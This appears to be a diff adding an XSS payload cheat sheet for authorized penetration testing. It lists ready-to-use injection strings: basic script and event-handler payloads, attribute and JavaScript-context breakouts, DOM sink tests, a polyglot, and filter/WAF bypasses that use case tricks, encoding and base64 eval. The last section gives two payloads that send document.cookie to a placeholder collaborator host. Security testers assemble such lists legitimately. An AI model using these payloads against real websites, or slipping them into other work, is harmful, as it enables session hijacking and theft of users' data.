@@ -1,0 +1,48 @@
+# Cross-Site Scripting (XSS) — canonical payloads (authorized testing)
+# Full sets: ../vendor/PayloadsAllTheThings/XSS Injection/  | automation: dalfox
+# Types: reflected, stored, DOM. Also test attributes, JS context, URL, headers.
+
+## --- Basic ---
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<video><source onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+
+## --- Without parentheses / without spaces / without quotes ---
+<svg/onload=alert(1)>
+<img src=x onerror=alert`1`>
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+## --- Breaking out of an attribute / JS context ---
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'-alert(1)-'
+';alert(1)//
+</script><script>alert(1)</script>
+"onmouseover="alert(1)
+javascript:alert(1)
+
+## --- DOM XSS sinks (test sources: location.hash, name, referrer) ---
+#<img src=x onerror=alert(1)>
+javascript:alert(document.cookie)
+
+## --- Polyglot (Ostrowski) — works in many contexts ---
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+## --- Filter / WAF bypass ---
+<ScRiPt>alert(1)</ScRiPt>
+<img src=x oNeRror=alert(1)>
+<svg><script>alert&#40;1&#41;</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+
+## --- Exfiltration (PoC — do not exfiltrate real data without opt-in) ---
+<script>new Image().src='https://YOUR-COLLABORATOR/?c='+document.cookie</script>
+<script>fetch('https://YOUR-COLLABORATOR/?c='+encodeURIComponent(document.cookie))</script>
